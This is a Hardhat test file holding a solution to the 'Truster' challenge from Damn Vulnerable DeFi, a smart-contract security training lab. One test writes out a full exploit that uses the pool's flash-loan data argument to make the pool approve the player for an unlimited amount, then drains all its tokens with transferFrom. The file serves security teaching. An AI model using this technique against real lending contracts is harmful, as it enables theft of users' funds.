const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Truster", function () {
  let deployer, player;
  let token, pool;

  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

  beforeEach(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();
    pool = await (
      await ethers.getContractFactory("TrusterLenderPool", deployer)
    ).deploy(token.address);
    expect(await pool.token()).to.eq(token.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

    expect(await token.balanceOf(player.address)).to.equal(0);
  });

  it("Execution (one transaction, attacker is a smart contract)", async function () {
    await (
      await ethers.getContractFactory("TrusterLenderPoolAttacker", player)
    ).deploy(pool.address, token.address);
  });

  it("Execution (two transactions, attacker is not a smart contract)", async function () {
    // 1. Prepare the flash loan `data` argument mimicking an
    // `abi.encodeCall(token.approve, (borrower, amount))` with ethers.js
    const encodeCallFunctionId = ethers.utils
      .keccak256(`0x${Buffer.from("approve(address,uint256)").toString("hex")}`)
      .slice(0, 10);
    const encodedCallArgs = ethers.utils.defaultAbiCoder.encode(
      ["address", "uint256"],
      [player.address, ethers.constants.MaxUint256]
    );

    // 2. Execute the flash loan to set the desired token `allowance` for the pool-player pair.
    await pool
      .connect(player)
      .flashLoan(
        0n,
        player.address,
        token.address,
        `${encodeCallFunctionId}${encodedCallArgs.slice(2)}`
      );
    // 3. Finally, transfer all funds from pool to player.
    await token
      .connect(player)
      .transferFrom(
        pool.address,
        player.address,
        await token.balanceOf(pool.address)
      );
  });

  afterEach(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  });
});
